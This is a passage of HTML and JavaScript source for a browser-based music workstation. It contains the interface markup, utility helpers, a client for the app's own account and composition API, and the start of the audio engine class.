			<button class="btn btnLarge headBtn headDropdown-btn gsuiIcon" id="cmpsBtn" data-icon="musics" title="Create cloud/local compositions"></button>
			<!--#cmps-->
			<div class="headDropdown-backdrop"></div>
		</div>
	</div>
	<div id="headCmp">
		<button id="headCmpSave" class="btn cmp-save gsuiIcon" title="Save composition"></button>
		<button id="headCmpInfo" class="btn" title="Edit composition's title">
			<i id="headCmpIcon" class="gsuiIcon"></i>
			<span id="headCmpName"></span>
			<span id="headCmpHover" class="gsuiIcon" data-icon="pen"></span>
			<span id="headCmpDur"></span>
		</button>
	</div>
	<div id="ctrlA">
		<div id="headGain" class="btnMarge" title="Main app volume (this will not affect the rendering)">
			<gsui-slider type="linear-y" min="0" max="1" step=".01" mousemove-size="150"></gsui-slider>
		</div>
		<div id="headPlay" class="btnGroup btnMarge">
			<button class="playBtn btn" id="playToggle" data-dir="up" title="Toggle focus between the composition and piano windows"><span></span><span></span></button>
			<button class="playBtn btn btnLarge gsuiIcon" id="play" data-icon="play"></button>
			<button class="playBtn btn btnLarge gsuiIcon" id="stop" data-icon="stop"></button>
		</div>
		<button id="headTempo" class="btn btnMarge" title="Edit the time signature and BPM">
			<div id="timeSignature">
				<span id="beatsPerMeasure"></span>
				<span id="stepsPerBeat"></span>
			</div>
			<div id="bpm"></div>
		</button>
	</div>
	<div id="ctrlB">
		<div id="headHist" class="btnGroup btnMarge">
			<button class="histBtn btn btnLarge gsuiIcon" id="undo" data-icon="undo" title="Undo the previous action"></button>
			<button class="histBtn btn btnLarge gsuiIcon" id="redo" data-icon="redo" title="Redo the last action"></button>
			<button class="histBtn btn headDropdown-btn gsuiIcon" id="undoMore" data-icon="caret-down" title="Show the actions list"></button>
			<!--#history-->
			<div class="headDropdown-backdrop"></div>
		</div>
		<canvas id="headAnalyser" class="btnMarge"></canvas>
		<button id="headExport" class="btn btnMarge btnLarge btnBg gsuiIcon" data-icon="export" title="Export the composition"></button>
		<button id="headSettings" class="btn btnMarge btnLarge btnBg gsuiIcon" data-icon="settings" title="Settings"></button>
		<!-- <button id="headMidi" class="btn btnMarge btnLarge btnBg gsuiIcon" data-icon="midi" title="Midi devices"></button> -->
	</div>
	<div id="headCurrentTime">
		<gsui-slider type="linear-x" min="0" step=".01"></gsui-slider>
	</div>
	<div id="winBtns">
		<button class="btn btnMarge winBtn" data-win="blocks" title="Open/close the blocks window">blocks</button>
		<button class="btn btnMarge winBtn" data-win="mixer" title="Open/close the mixer window">mixer</button>
		<button class="btn btnMarge winBtn" data-win="synth" title="Open/close the synthesizer window">synth</button>
		<button class="btn btnMarge winBtn" data-win="main" title="Open/close the composition window">composition</button>
		<button class="btn btnMarge winBtn" data-win="drums" title="Open/close the drums window">drums</button>
		<button class="btn btnMarge winBtn" data-win="piano" title="Open/close the piano window">pianoroll</button>
		<button class="btn btnMarge winBtn" data-win="effects" title="Open/close the effects window">effects</button>
	</div>
	<div id="headHelp">
		<button class="btn btnMarge btnLarge btnBg gsuiIcon" id="cookies" data-icon="cookie" title="Cookies"></button>
		<button class="btn btnMarge btnLarge btnBg gsuiIcon" id="helpKeyboardShortcuts" data-icon="keyboard" title="Keyboard shortcuts"></button>
		<a      class="btn btnMarge btnLarge btnBg gsuiIcon" id="help" data-icon="help" title="Help" href="https://squencer.netlify.app/music.html" target="_blank" rel="noopener"></a>
		<a      class="btn btnMarge btnLarge btnBg gsuiIcon" id="changelog" data-icon="changelog" title="Changelog" href="https://squencer.netlify.app" target="_blank" rel="noopener"></a>
		<button class="btn btnMarge btnLarge btnBg gsuiIcon" id="helpAbout" data-icon="about" title="About"></button>
	</div>
	<div id="headVersion">
		<a id="headVersionBtn" class="headDropdown-btn" title="Access older versions" href="https://squencer.netlify.app" target="_blank" rel="noopener">
			<i class="gsuiIcon" data-icon="list"></i>
			<span id="headVersionNum"></span>
		</a>
	</div>
</div>
<div class="cmp" id="cmp" draggable="true" data-remove data-remove-id>
	<button data-action="save" class="cmp-btn cmp-save gsuiIcon"></button>
	<a href data-action="open" class="cmp-info">
		<div class="cmp-name"></div>
		<div>
			<span class="cmp-duration-wrap">
				<i class="gsuiIcon" data-icon="clock"></i>
				<span class="cmp-duration"></span>
			</span>
			<span class="cmp-bpm-wrap">
				<i class="gsuiIcon" data-icon="speed"></i>
				<span class="cmp-bpm"></span>
			</span>
		</div>
	</a>
	<a href class="cmp-btn cmp-btn-light gsuiIcon" data-action="json" data-icon="file-export" title="Export to JSON file"></a>
	<button class="cmp-btn cmp-btn-light gsuiIcon" data-action="delete" data-icon="minus-oct" title="Delete"></button>
</div>
<div id="cmps" class="headDropdown" tabindex="0">
	<div class="headDropdown-head" id="cmpsLocalTitle">
		<i class="headDropdown-icon gsuiIcon" data-icon="local"></i>
		<span class="headDropdown-title">local</span>
		<button class="windowBtn" id="localNewCmp" title="Create a new composition on this computer">
			<i class="windowBtnIcon gsuiIcon" data-icon="plus"></i>
			<span class="windowBtnText">new</span>
		</button>
		<button class="windowBtn" id="localOpenCmp" title="Open a composition on this computer">
			<i class="windowBtnIcon gsuiIcon" data-icon="folder-open"></i>
			<span class="windowBtnText">open</span>
		</button>
	</div>
	<div class="headDropdown-head" id="cmpsCloudTitle">
		<i class="headDropdown-icon gsuiIcon" data-icon="cloud"></i>
		<span class="headDropdown-title">cloud</span>
		<button class="windowBtn" id="cloudNewCmp" title="Create a new composition on your cloud profile">
			<i class="windowBtnIcon gsuiIcon" data-icon="plus"></i>
			<span class="windowBtnText">new</span>
		</button>
	</div>
	<div class="headDropdown-list" id="cmpsLocalList">
		<div class="placeholder">
			<span>there is no local composition here</span>
		</div>
	</div>
	<div class="headDropdown-list" id="cmpsCloudList">
		<div class="placeholder">
			<span>you don't have any cloud composition yet</span>
			<span>you are not connected</span>
		</div>
	</div>
</div>
<div id="history" class="headDropdown" tabindex="0">
	<div class="headDropdown-head" id="historyTitle">
		<i class="headDropdown-icon gsuiIcon" data-icon="history"></i>
		<span class="headDropdown-title">history</span>
	</div>
	<div class="headDropdown-list" id="historyList">
		<div class="placeholder">
			<span>there is nothing to undo</span>
		</div>
	</div>
</div>
<div class="historyAction" id="historyAction" data-remove data-remove-id>
	<i class="historyAction-icon gsuiIcon"></i>
	<span class="historyAction-text"></span>
</div>
<div data-window="blocks"></div>
<div data-window="mixer"></div>
<div data-window="synth">
	<div class="windowMenu">
		<button id="synthName" class="windowBtn windowDataBtn"></button>
		<i id="synthDestArrow" class="gsuiIcon" data-icon="arrow-right"></i>
		<button id="synthChannelBtn" class="windowBtn">
			<i class="windowBtnIcon gsuiIcon" data-icon="mixer"></i>
			<span id="synthChannelBtnText" class="windowBtnText"></span>
		</button>
	</div>
</div>
<div data-window="piano">
	<div class="windowMenu">
		<button id="pianorollName" class="windowBtn windowDataBtn"></button>
	</div>
	<div id="pianorollForbidden" class="no-select"></div>
</div>
<div data-window="main"></div>
<div data-window="effects">
	<div class="windowMenu">
		<button id="channelName" class="windowBtn windowDataBtn"></button>
	</div>
	<div class="windowBetaMsg">
		Beta: the effects may not work as expected due to browser support
	</div>
</div>
<div data-window="drums">
	<div class="windowMenu">
		<button id="drumsName" class="windowBtn windowDataBtn"></button>
	</div>
</div>
<div class="popup" id="authPopupContent" data-remove>
	<fieldset>
		<legend>Sign in</legend>
		<div class="param">
			<div class="param-title">
				<span>Email</span>
				<small>or username</small>
			</div>
			<div class="param-values">
				<input type="text" name="email"/>
			</div>
		</div>
		<div class="param">
			<div class="param-title">
				<span>Password</span>
			</div>
			<div class="param-values">
				<input type="password" name="password"/>
			</div>
		</div>
		<div id="authPopupError" class="popup-error-msg"></div>
	</fieldset>
	<a target="_blank" rel="noopener" href="https://squencer.netlify.app/#/forgotPassword">Forgot password&nbsp;?</a><br/>
	<a target="_blank" rel="noopener" href="https://squencer.netlify.app/#/auth">Create a new account</a>
</div>
<div class="popup" id="openPopupContent" data-remove>
	<fieldset>
		<legend>Open and load a new composition</legend>
		<div class="param">
			<div class="param-title">With an URL</div>
			<div class="param-values">
				<input id="inputOpenURL" name="url" type="url" placeholder="http://"/>
			</div>
		</div>
		<div class="param">
			<div class="param-title">
				With a local file<br/>
				<small>(Please notice that you can also drop a file into the app)</small>
			</div>
			<div class="param-values">
				<input id="inputOpenFile" name="file" type="file"/>
			</div>
		</div>
	</fieldset>
</div>
<div class="popup" id="aboutPopupContent" data-remove>
	<div class="title">
		<span>SquencerSynthBeginner</span>
		<span id="version">
			<span id="versionNum"></span>
			<i id="versionIcon" class="gsuiIcon"></i>
			<span id="versionCheck">check the version</span>
		</span>
	</div>
	<div>
		<img src="yoga.jpg" alt="Young Generations Audio" width="300" height="100%">
		Squencer is a <b>work-in-progress</b> free browser-based digital audio workstation following the
		<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API">Web Audio API</a>.
	</div>
	<div>
		You can or don't create an account (by clicking <i class="gsuiIcon" data-icon="profile"></i>)
		and start uploading your compositions online <i class="gsuiIcon" data-icon="cloud"></i>
	</div>
	<div class="social-network">
		<a target="_blank" rel="noopener" title="GitHub"   class="gsuiIcon gsuiIconB" data-icon="github"   href="https://squencer.netlify.app"></a>
		<a target="_blank" rel="noopener" title="Twitter"  class="gsuiIcon gsuiIconB" data-icon="twitter"  href="https://twitter.com/"></a>
		<a target="_blank" rel="noopener" title="YouTube"  class="gsuiIcon gsuiIconB" data-icon="youtube"  href="https://youtube.com/channel/"></a>
		<a target="_blank" rel="noopener" title="Facebook" class="gsuiIcon gsuiIconB" data-icon="facebook" href="https://facebook.com/RRRrecording"></a>
		<a target="_blank" rel="noopener" title="CodePen"  class="gsuiIcon gsuiIconB" data-icon="codepen"  href="https://codepen.io/"></a>
		<a target="_blank" rel="noopener" title="Discord"  class="gsuiIcon gsuiIconB" data-icon="discord"  href="https://discord.gg/"></a>
	</div>
</div>
<div class="popup" id="tempoPopupContent" data-remove>
	<fieldset>
		<legend>BPM / time signature</legend>
		<div class="param">
			<div class="param-title">Beats per measure</div>
			<div class="param-values"><input id="tempoBeatsPM" name="beatsPerMeasure" type="number" min="1" max="16"/></div>
		</div>
		<div class="param">
			<div class="param-title">Steps per beat</div>
			<div class="param-values"><input id="tempoStepsPB" name="stepsPerBeat" type="number" min="1" max="16"/></div>
		</div>
		<div class="param">
			<div class="param-title">BPM (Beats Per Minute)</div>
			<div class="param-values">
				<input id="tempoBPM" name="bpm" type="number" min="1" max="999"/>
				<a id="tempoBPMTap" class="gsuiIcon" data-icon="tint"></a>
			</div>
		</div>
	</fieldset>
</div>
<div class="popup" id="renderPopupContent" data-remove>
	<fieldset>
		<legend>Render the current composition</legend>
		<div id="renderWrap">
			<a href id="renderBtn">
				<span id="renderBtn0">
					<span>Render</span>
					<i class="gsuiIcon" data-icon="render"></i>
				</span>
				<span id="renderBtn1">
					<span>Rendering...</span>
					<i class="gsuiIcon" data-spin="on"></i>
				</span>
				<span id="renderBtn2">
					<span>Download WAV file</span>
					<i class="gsuiIcon" data-icon="export"></i>
				</span>
			</a>
			<progress id="renderProgress" value="" max="1"></progress>
		</div>
	</fieldset>
</div>
<div class="popup" id="settingsPopupContent" data-remove>
	<fieldset>
		<legend>UI refresh rate</legend>
		<div class="param">
			<div class="param-title">Auto</div>
			<div class="param-values">
				<label>
					<input id="settingsUIRateModeAuto" name="UIRateMode" type="radio" value="auto"/>
					<span class="settingsPopupFps">60</span>
				</label>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Manual</div>
			<div class="param-values">
				<label>
					<input id="settingsUIRateModeManual" name="UIRateMode" type="radio" value="manual"/>
					<span id="settingsUIRateManualFps" class="settingsPopupFps"></span>
				</label>
				<input id="settingsUIRateManual" name="UIRateManual" type="range" step="1" min="5" max="40"/>
			</div>
		</div>
	</fieldset>
	<fieldset>
		<legend>Windows</legend>
		<div class="param">
			<div class="param-title">Move/resize mode</div>
			<div class="param-values">
				<label>
					<input id="settingsWindowsMode" name="windowsDirectMode" type="checkbox"/>
					<span>direct</span>
				</label>
			</div>
		</div>
	</fieldset>
</div>
<div class="popup" id="shortcutsPopupContent" data-remove>
	<fieldset>
		<legend>Global shortcuts</legend>
		<div class="param">
			<div class="param-title">Save the current composition</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">S</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Open a composition</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">O</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Open a new composition</div>
			<div class="param-values">
				<kbd class="shortcuts">Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">N</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Play / pause the selected grid</div>
			<div class="param-values">
				<kbd class="shortcuts">Space</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Undo the previous action</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">Z</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Redo the next action</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">Shift</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">Z</kbd>
			</div>
		</div>
	</fieldset>
	<fieldset>
		<legend>Grids shortcuts</legend>
		<div class="param">
			<div class="param-title">Select all the blocks of the focused grid</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">A</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Deselect all the blocks of the focused grid</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">D</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Duplicate (copy/paste) the selected blocks</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / Alt</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">B</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Delete all the selected blocks of the focused grid</div>
			<div class="param-values">
				<kbd class="shortcuts">Delete</kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Move vertically inside the grids</div>
			<div class="param-values">
				<kbd class="shortcuts">Scroll <i class="gsuiIcon" data-icon="arrows-v"></i></kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">Move horizontally inside the grids</div>
			<div class="param-values">
				<kbd class="shortcuts">Shift</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">Scroll <i class="gsuiIcon" data-icon="arrows-v"></i></kbd>
			</div>
		</div>
		<div class="param">
			<div class="param-title">
				Zoom-in / zoom-out<br/>
				Zoom X by scrolling above the grid<br/>
				Zoom Y by scrolling above the keys<br/>
			</div>
			<div class="param-values">
				<kbd class="shortcuts">Ctrl / ?</kbd><i class="shortcuts-sep gsuiIcon" data-icon="plus"></i>
				<kbd class="shortcuts">Scroll <i class="gsuiIcon" data-icon="arrows-v"></i></kbd>
			</div>
		</div>
	</fieldset>
</div>
<div class="popup" id="selectChanPopupContent" data-remove>
	<fieldset>
		<legend>Select a channel</legend>
		<select id="selectChanPopupSelect" size="8" name="channel"></select>
	</fieldset>
</div>
<div id="gsuiPianoroll-template" class="gsuiBlocksManager gsuiPianoroll" tabindex="-1"></div>

<div class="gsuiBlocksManager-block gsuiPianoroll-block" id="gsuiPianoroll-block-template" data-action="move">
	<div class="gsuiDragline-drop"></div>
	<div class="gsuiPianoroll-block-env gsuiPianoroll-block-attack">
		<div class="gsuiPianoroll-block-envHandle" data-action="attack"></div>
		<div class="gsuiPianoroll-block-envBg"></div>
	</div>
	<div class="gsuiPianoroll-block-env gsuiPianoroll-block-release">
		<div class="gsuiPianoroll-block-envHandle" data-action="release"></div>
		<div class="gsuiPianoroll-block-envBg"></div>
	</div>
	<div class="gsuiBlocksManager-block-crop gsuiBlocksManager-block-cropB" data-action="cropB"></div>
</div>
<div id="gsuiPatternroll-template" class="gsuiBlocksManager gsuiPatternroll" tabindex="-1"></div>

<div id="gsuiPatternroll-block-template" class="gsuiBlocksManager-block gsuiPatternroll-block" data-action="move">
	<div class="gsuiBlocksManager-block-crop gsuiBlocksManager-block-cropA" data-action="cropA"></div>
	<div class="gsuiBlocksManager-block-crop gsuiBlocksManager-block-cropB" data-action="cropB"></div>
	<div class="gsuiPatternroll-block-header">
		<span class="gsuiPatternroll-block-name"></span>
	</div>
	<div class="gsuiPatternroll-block-content"></div>
	<div class="gsuiPatternroll-block-placeholder">
		<i class="gsuiPatternroll-block-placeholderIcon gsuiIcon" data-icon="file-corrupt"></i>
		<span class="gsuiPatternroll-block-placeholderText">missing data</span>
	</div>
</div>
<script>
"use strict";

if ( navigator.serviceWorker &&
	document.cookie.indexOf( "cookieAccepted" ) > -1
) {
	navigator.serviceWorker.register( "serviceWorker.js" )
		.then( reg => {
			console.log( `Service worker ${
				reg.installing ? "installing" :
				reg.waiting ? "installed" :
				reg.active ? "active" : "" }` );
		}, console.log.bind( console, "Service worker registration failed" ) );
}

if ( !window.AudioContext || !window.customElements ) {
	window.top.location = "https://squencer.netlify.app/unsupported-browsers";
}

const GSUtils = {};

GSUtils.addIfNotEmpty = ( obj, attr, valObj ) => {
	if ( GSUtils.isntEmpty( valObj ) ) {
		if ( attr in obj ) {
			GSUtils.deepAssign( obj[ attr ], valObj );
		} else {
			obj[ attr ] = valObj;
		}
	}
	return obj;
};

GSUtils.castToNumber = ( n, def, min, max, fix ) => {
	const x = Number.isFinite( +n )
			? Math.max( min, Math.min( n, max ) )
			: def;

	return typeof fix === "number"
		? +x.toFixed( 2 )
		: +x;
};

GSUtils.composeUndo = ( data, redo ) => {
	if ( GSUtils.isObject( data ) && GSUtils.isObject( redo ) ) {
		return Object.freeze( Object.entries( redo ).reduce( ( undo, [ k, val ] ) => {
			if ( data[ k ] !== val ) {
				undo[ k ] = GSUtils.composeUndo( data[ k ], val );
			}
			return undo;
		}, {} ) );
	}
	return data;
};

GSUtils.createUpdateDelete = ( dataSrc, fnCreate, fnUpdate, fnDelete, dataChange ) => {
	if ( dataChange ) {
		Object.entries( dataChange ).forEach( ( [ id, obj ] ) => {
			if ( !obj ) {
				if ( id in dataSrc ) {
					fnDelete( id, dataChange );
				}
			} else if ( id in dataSrc ) {
				fnUpdate( id, obj, dataChange );
			} else {
				fnCreate( id, obj, dataChange );
			}
		} );
	}
};

GSUtils.deepAssign = ( a, b ) => {
	if ( b ) {
		Object.entries( b ).forEach( ( [ k, val ] ) => {
			if ( !GSUtils.isObject( val ) ) {
				a[ k ] = val;
			} else if ( !GSUtils.isObject( a[ k ] ) ) {
				a[ k ] = GSUtils.deepCopy( val );
			} else {
				GSUtils.deepAssign( a[ k ], val );
			}
		} );
	}
	return a;
};

GSUtils.deepCopy = obj => {
	if ( GSUtils.isObject( obj ) ) {
		return Object.entries( obj ).reduce( ( cpy, [ k, v ] ) => {
			cpy[ k ] = GSUtils.deepCopy( v );
			return cpy;
		}, {} );
	}
	return obj;
};

GSUtils.deepFreeze = obj => {
	if ( GSUtils.isObject( obj ) ) {
		Object.freeze( obj );
		Object.values( obj ).forEach( GSUtils.deepFreeze );
	}
	return obj;
};

GSUtils.diffAssign = ( a, b ) => {
	if ( b ) {
		Object.entries( b ).forEach( ( [ k, val ] ) => {
			if ( a[ k ] !== val ) {
				if ( val === undefined ) {
					delete a[ k ];
				} else if ( !GSUtils.isObject( val ) ) {
					a[ k ] = val;
				} else if ( !GSUtils.isObject( a[ k ] ) ) {
					a[ k ] = GSUtils.jsonCopy( val );
				} else {
					GSUtils.diffAssign( a[ k ], val );
				}
			}
		} );
	}
	return a;
};

GSUtils.isEmpty = obj => {
	for ( const a in obj ) {
		return false;
	}
	return true;
};

GSUtils.isntEmpty = obj => !GSUtils.isEmpty( obj );

GSUtils.isObject = o => o !== null && typeof o === "object";

GSUtils.jsonCopy = obj => JSON.parse( JSON.stringify( obj ) );

GSUtils.mapCallbacks = ( names, fns ) => {
	const on = {};

	names.forEach( n => on[ n ] = GSUtils.noop );
	Object.assign( Object.seal( on ), fns );
	return Object.freeze( on );
};

GSUtils.noop = () => {};
GSUtils.isNoop = fn => !fn || fn === GSUtils.noop;

GSUtils.panningMerge = ( ...pans ) => {
	const lr = pans.map( GSUtils.panningSplitLR )
		.reduce( ( ret, lr ) => {
			ret[ 0 ] *= lr[ 0 ];
			ret[ 1 ] *= lr[ 1 ];
			return ret;
		}, [ 1, 1 ] );

	return GSUtils.panningMergeLR( ...lr );
};

GSUtils.panningMergeLR = ( l, r ) => {
	return (
		l > r ? -1 + r / l :
		l < r ?  1 - l / r : 0
	);
};

GSUtils.panningSplitLR = pan => {
	return (
		pan < 0 ? [ 1, 1 + pan ] :
		pan > 0 ? [ 1 - pan, 1 ] : [ 1, 1 ]
	);
};

GSUtils.parseBeatsToBeats = ( beats, stepsPerBeat ) => {
	const steps = beats % 1 * stepsPerBeat;

	return [
		`${ beats + 1 | 0 }`,
		`${ steps + 1 | 0 }`.padStart( 2, "0" ),
		`${ steps * 1000 % 1000 | 0 }`.padStart( 3, "0" ),
	];
};

GSUtils.parseBeatsToSeconds = ( beats, bpm ) => {
	const seconds = beats / ( bpm / 60 );

	return [
		`${ seconds / 60 | 0 }`,
		`${ seconds % 60 | 0 }`.padStart( 2, "0" ),
		`${ seconds * 1000 % 1000 | 0 }`.padStart( 3, "0" ),
	];
};

GSUtils.plural = ( nb, word, s ) => {
	const w = word[ word.length - 1 ] === "s"
			? word
			: `${ word }${ nb > 1 ? "s" : "" }`,
		ws = s !== "'s"
			? w
			: `${ w }'${ w[ w.length - 1 ] === "s" ? "" : "s" }`

	return `${ nb } ${ ws }`;
};

GSUtils.trim2 = str => str ? str.trim().replace( /\s+/g, " " ) : "";

GSUtils.uniqueName = ( nameOri, arr ) => {
	const name = GSUtils.trim2( nameOri );

	if ( arr.indexOf( name ) > -1 ) {
		const name2 = /-\d+$/.test( name )
				? name.substr( 0, name.lastIndexOf( "-" ) ).trim()
				: name,
			reg = new RegExp( `^${ name2 }-(\\d+)$` ),
			nb = arr.reduce( ( nb, str ) => {
				const res = reg.exec( str );

				return res ? Math.max( nb, +res[ 1 ] ) : nb;
			}, 1 );

		return `${ name2 }-${ nb + 1 }`;
	}
	return name;
};

GSUtils.uuid = () => {
	const rnd = crypto.getRandomValues( new Uint8Array( 36 ) ),
		uuid = rnd.reduce( ( arr, n ) => {
			arr.push( ( n % 16 ).toString( 16 ) );
			return arr;
		}, [] );

	uuid[ 14 ] = "4";
	uuid[ 19 ] = ( 8 + rnd[ 19 ] % 4 ).toString( 16 );
	uuid[ 8 ] =
	uuid[ 13 ] =
	uuid[ 18 ] =
	uuid[ 23 ] = "-";
	return uuid.join( "" );
};

Object.freeze( GSUtils );

const gsapiClient = {
	url: "https://squencer.netlify.app/",
	headers: Object.freeze( {
		"Content-Type": "application/json; charset=utf-8",
	} ),

	// store
	// ........................................................................
	user: {},

	// ........................................................................
	getMe() {
		return this._fetch( "GET", "getMe.php" )
			.then( me => this._assignMe( me ) );
	},
	getUser( username ) {
		return this._fetch( "GET", `getUser.php?username=${ username }` )
			.then( ( { data } ) => {
				data.usernameLow = data.username.toLowerCase();
				return data;
			} );
	},
	getUserCompositions( iduser ) {
		return this._fetch( "GET", `getUserCompositions.php?id=${ iduser }` )
			.then( ( { data } ) => {
				data.forEach( cmp => cmp.data = JSON.parse( cmp.data ) );
				return data;
			} );
	},
	getComposition( id ) {
		return this._fetch( "GET", `getComposition.php?id=${ id }` )
			.then( ( { data } ) => {
				data.composition.data = JSON.parse( data.composition.data );
				return data;
			} );
	},
	login( email, pass ) {
		return this._fetch( "POST", "login.php", { email, pass } )
			.then( me => this._assignMe( me ) );
	},
	signup( username, email, pass ) {
		return this._fetch( "POST", "createUser.php", { username, email, pass } )
			.then( me => this._assignMe( me ) );
	},
	resendConfirmationEmail() {
		return this._fetch( "POST", "resendConfirmationEmail.php", { email: this.user.email } );
	},
	recoverPassword( email ) {
		return this._fetch( "POST", "recoverPassword.php", { email } );
	},
	resetPassword( email, code, pass ) {
		return this._fetch( "POST", "resetPassword.php", { email, code, pass } );
	},
	logout() {
		return this._fetch( "POST", "logout.php", { confirm: true } )
			.then( res => this._deleteMe( res ) );
	},
	logoutRefresh() {
		return this.logout()
			.then( () => {
				setTimeout( () => location.href =
					location.origin + location.pathname, 500 );
			} );
	},
	updateMyInfo( obj ) {
		return this._fetch( "POST", "updateMyInfo.php", obj )
			.then( me => this._assignMe( me ) );
	},
	saveComposition( cmp ) {
		return this._fetch( "POST", "saveComposition.php",
			{ composition: JSON.stringify( cmp ) } );
	},
	deleteComposition( id ) {
		return this._fetch( "POST", "deleteComposition.php", { id } );
	},

	// private:
	_assignMe( res ) {
		const u = res.data;

		u.usernameLow = u.username.toLowerCase();
		u.emailpublic = u.emailpublic === "1";
		u.emailchecked = u.emailchecked === "1";
		Object.assign( this.user, u );
		return u;
	},
	_deleteMe( res ) {
		Object.keys( this.user ).forEach( k => delete this.user[ k ] );
		return res;
	},
	_fetch( method, url, body ) {
		const obj = {
			method,
			headers: this.headers,
			credentials: "include",
		};

		if ( body ) {
			obj.body = JSON.stringify( body );
		}
		return fetch( this.url + url, obj )
			.then( res => res.text() ) // 1.
			.then( text => {
				try {
					return JSON.parse( text );
				} catch ( e ) {
					return {
						ok: false,
						code: 500,
						msg: text,
					};
				}
			} )
			.then( res => this._fetchThen( res ) );
	},
	_fetchThen( res ) {
		if ( !res.ok ) {
			res.msg = this.errorCode[ res.msg ] || res.msg;
			throw res; // 2.
		}
		return res;
	},

	// ........................................................................
	errorCode: {
		"user:not-connected": "You are not connected",
		"query:bad-format": "The query is incomplete or corrupted",
		"login:fail": "The email/password don't match",
		"pass:too-short": "The password is too short",
		"email:too-long": "The email is too long",
		"email:not-found": "This email is not in the database",
		"email:duplicate": "This email is already used",
		"email:bad-format": "The email is not correct",
		"email:not-verified": "Your email is not verified",
		"username:too-long": "The username is too long",
		"username:too-short": "The username is too short",
		"username:duplicate": "This username is already taken",
		"username:bad-format": "The username can only contains letters, digits and _",
		"password:bad-code": "Can not change the password because the secret code and the email do not match",
		"password:already-recovering": "A recovering email has already been sent to this address less than 1 day ago",
	},
};

/*
1. Why res.text() instead of res.json() ?
   To handle the case where PHP returns a text error/exception with a default 200 code.

2. Every not-ok queries will throw the result instead of return it, why?
   To handle nicely the errors in the UI side, like:
   query().finally().then( OK, KO )
*/

class DAWCore {
	constructor() {
		const ctx = new AudioContext(),
			wadrumrows = new gswaDrumrows();

		this.cb = {};
		this.env = Object.seal( {
			def_bpm: 120,
			def_appGain: 4,
			def_nbTracks: 21,
			def_stepsPerBeat: 4,
			def_beatsPerMeasure: 4,
			analyserFFTsize: 8192,
			analyserEnable: true,
			clockSteps: false,
		} );
		this.cmps = {
			local: new Map(),
			cloud: new Map(),
		};
		this.ctx = ctx;
		this._wadrumrows = wadrumrows;
		this.drums = new DAWCore.Drums( this );
		this.buffers = new DAWCore.Buffers( this );
		this.history = new DAWCore.History( this );
		this.pianoroll = new DAWCore.Pianoroll( this );
		this.composition = new DAWCore.Composition( this );
		this.destination = new DAWCore.Destination( this );
		this._loop = this._loop.bind( this );
		this._loopMs = 1;
		this._focused = this.composition;
		this._focusedStr = "composition";
		this.get = {
			saveMode: () => this.composition.cmp.options.saveMode,
			currentTime: () => this.composition.currentTime,
			composition: ( saveMode, id ) => this.cmps[ saveMode ].get( id ),
			// .................................................................
			ctx: () => this.ctx,
			audioDestination: () => this.destination.getDestination(),
			audioBuffer: id => this.buffers.getBuffer( this.composition.cmp.buffers[ id ] ).buffer,
			audioChanIn: id => this.composition._wamixer.getChanInput( id ),
			audioChanOut: id => this.composition._wamixer.getChanOutput( id ),
			audioEffect: id => this.composition._waeffects._wafxs.get( id ),
			audioSynth: id => this.composition._synths.get( id ),
			// .................................................................
			cmp: () => this.composition.cmp,
			id: () => this.composition.cmp.id,
			bpm: () => this.composition.cmp.bpm,
			name: () => this.composition.cmp.name,
			loopA: () => this.composition.cmp.loopA,
			loopB: () => this.composition.cmp.loopB,
			duration: () => this.composition.cmp.duration,
			beatsPerMeasure: () => this.composition.cmp.beatsPerMeasure,
			stepsPerBeat: () => this.composition.cmp.stepsPerBeat,
			synthOpened: () => this.composition.cmp.synthOpened,
			patternBufferOpened: () => this.composition.cmp.patternBufferOpened,
			patternDrumsOpened: () => this.composition.cmp.patternDrumsOpened,
			patternKeysOpened: () => this.composition.cmp.patternKeysOpened,
			// .................................................................
			block: id => this.composition.cmp.blocks[ id ],
			blocks: () => this.composition.cmp.blocks,
			buffer: id => this.composition.cmp.buffers[ id ],
			buffers: () => this.composition.cmp.buffers,
			channel: id => this.composition.cmp.channels[ id ],
			channels: () => this.composition.cmp.channels,
			drumrow: id => this.composition.cmp.drumrows[ id ],
			drumrows: () => this.composition.cmp.drumrows,
			drums: id => id ? this.composition.cmp.drums[ id ] : this.composition.cmp.drums, // 1.
			effect: id => this.composition.cmp.effects[ id ],
			effects: () => this.composition.cmp.effects,
			keys: id => id ? this.composition.cmp.keys[ id ] : this.composition.cmp.keys, // 1.
			pattern: id => this.composition.cmp.patterns[ id ],
